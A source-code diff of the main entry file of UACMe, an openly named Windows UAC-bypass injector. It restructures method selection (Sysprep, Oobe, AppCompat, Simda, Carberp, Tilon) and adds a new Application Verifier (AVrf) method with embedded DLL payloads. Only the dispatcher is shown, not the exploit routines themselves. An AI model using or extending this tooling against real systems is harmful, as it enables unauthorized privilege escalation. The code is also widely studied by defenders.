@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.40
+*  VERSION:     1.50
 *
-*  DATE:        04 Apr 2015
+*  DATE:        05 Apr 2015
 *
 *  Injector entry point.
 *
@@ -21,15 +21,20 @@
 
 #ifdef _WIN64
 #include "dll64.h"
-#define INJECTDLL dll64
+#define INJECTDLL Fubuki64
+#define AVRFDLL	Hibiki64
 #else
 #include "dll32.h"
-#define INJECTDLL dll32
+#define INJECTDLL Fubuki32
+#define AVRFDLL Hibiki32
 #endif
 
 #define PROGRAMTITLE TEXT("UACMe")
 #define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
 This is not supported, run x64 version of this tool.")
+#define WINPREBLUE TEXT("This method is only for pre Windows 8.1 use")
+#define WINBLUEONLY TEXT("This method is only for Windows 8.1 use")
+#define WOW64WIN32ONLY TEXT("This method only works from x86-32 Windows or Wow64")
 
 /*
 * main
@@ -46,7 +51,6 @@ VOID main()
 	WCHAR					szBuffer[MAX_PATH + 1];
 	TOKEN_ELEVATION_TYPE	ElevType;
 	RTL_OSVERSIONINFOW		osver;
-
 
 	//verify system version
 	RtlSecureZeroMemory(&osver, sizeof(osver));
@@ -78,60 +82,67 @@ VOID main()
 	bytesIO = 0;
 	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
 	if (GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO)) {
-		if (lstrcmpi(szBuffer, TEXT("1")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method Sysprep selected\n\r"));
-			dwType = METHOD_SYSPREP;
-		}
-		if (lstrcmpi(szBuffer, TEXT("2")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method Sysprep_ex selected\n\r"));
-			dwType = METHOD_SYSPREP_EX;
-		}
-		if (lstrcmpi(szBuffer, TEXT("3")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method Oobe selected\n\r"));
-			dwType = METHOD_OOBE;
-		}
-#ifndef _WIN64
-		if (lstrcmpi(szBuffer, TEXT("4")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method AppCompat selected\n\r"));
-			dwType = METHOD_APPCOMPAT;
-		}
+
+		dwType = strtoul(szBuffer);
+		switch (dwType) {
+
+		case METHOD_SYSPREP:
+			OutputDebugString(TEXT("[UCM] Sysprep\n\r"));
+			if (osver.dwBuildNumber > 9200) {
+				MessageBox(GetDesktopWindow(), WINPREBLUE,
+					PROGRAMTITLE, MB_ICONINFORMATION);
+				goto Done;
+			}
+			break;
+
+		case METHOD_SYSPREP_EX:
+			OutputDebugString(TEXT("[UCM] Sysprep_ex\n\r"));
+			if (osver.dwBuildNumber < 9600) {
+				MessageBox(GetDesktopWindow(), WINBLUEONLY,
+					PROGRAMTITLE, MB_ICONINFORMATION);
+				goto Done;
+			}
+			break;
+
+		case METHOD_OOBE:
+			OutputDebugString(TEXT("[UCM] Oobe\n\r"));
+			break;
+
+		case METHOD_APPCOMPAT:
+			OutputDebugString(TEXT("[UCM] AppCompat\n\r"));
+
+#ifdef _WIN64
+			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY, 
+				PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;
 #endif
-		if (lstrcmpi(szBuffer, TEXT("5")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method Simda selected\n\r"));
-			dwType = METHOD_SIMDA;
-		}
-		if (lstrcmpi(szBuffer, TEXT("6")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method Carberp selected\n\r"));
-			dwType = METHOD_CARBERP;
-		}
-		if (lstrcmpi(szBuffer, TEXT("7")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method Carberp_ex selected\n\r"));
-			dwType = METHOD_CARBERP_EX;
-		}
-		if (lstrcmpi(szBuffer, TEXT("8")) == 0) {
-			OutputDebugString(TEXT("[UCM] Method Tilon selected\n\r"));
-			dwType = METHOD_TILON;
-		}
+			break;
 
-	}
+		case METHOD_SIMDA:
+			OutputDebugString(TEXT("[UCM] Simda\n\r"));
+			break;
 
-	switch (dwType) {
-	case METHOD_TILON:
-	case METHOD_SYSPREP:
-		if (osver.dwBuildNumber > 9200) {
-			MessageBox(GetDesktopWindow(), TEXT("This method is only for pre Windows 8.1 use"),
-				PROGRAMTITLE, MB_ICONINFORMATION);
-			goto Done;
-		}
-		break;
-	case METHOD_SYSPREP_EX:
-		if (osver.dwBuildNumber < 9600) {
-			MessageBox(GetDesktopWindow(), TEXT("This method is only for Windows 8.1 use"),
-				PROGRAMTITLE, MB_ICONINFORMATION);
-			goto Done;
-		}
-		break;
+		case METHOD_CARBERP:
+			OutputDebugString(TEXT("[UCM] Carberp\n\r"));
+			break;
 
+		case METHOD_CARBERP_EX:
+			OutputDebugString(TEXT("[UCM] Carberp_ex\n\r"));
+			break;
+
+		case METHOD_TILON:
+			OutputDebugString(TEXT("[UCM] Tilon\n\r"));
+			if (osver.dwBuildNumber > 9200) {
+				MessageBox(GetDesktopWindow(), WINPREBLUE,
+					PROGRAMTITLE, MB_ICONINFORMATION);
+				goto Done;
+			}
+			break;
+
+		case METHOD_AVRF:
+			OutputDebugString(TEXT("[UCM] AVrf\n\r"));
+			break;
+		}
 	}
 
 
@@ -212,6 +223,20 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
 		}
 		break;
+
+	case METHOD_AVRF:
+#ifndef _DEBUG
+		if (IsWow64) {
+			MessageBoxW(GetDesktopWindow(),
+				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;
+		}
+#endif
+		if (ucmAvrfMethod(AVRFDLL, sizeof(AVRFDLL))) {
+			OutputDebugString(TEXT("[UCM] AVrf method called\n\r"));
+		}	
+		break;
+
 	}
 
 Done:
